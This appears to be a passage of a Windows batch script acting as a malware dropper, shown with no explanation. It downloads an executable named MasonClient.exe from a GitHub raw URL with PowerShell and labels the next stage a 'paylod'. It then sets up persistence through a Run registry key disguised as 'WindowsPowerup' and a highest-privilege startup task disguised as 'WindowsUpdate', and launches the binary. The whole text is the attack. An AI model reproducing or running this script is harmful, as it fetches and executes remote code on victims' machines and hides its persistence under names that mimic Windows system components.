...
PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/kinglearr2-cmd/max/raw/refs/heads/main/MasonClient.exe ','%programdata%\GG-Win\MasonClient.exe')
echo -----------start-paylod------------------------
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\MasonClient.exe"
schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\GG-Win\MasonClient.exe" /f
start %programdata%\GG-Win\MasonClient.exe
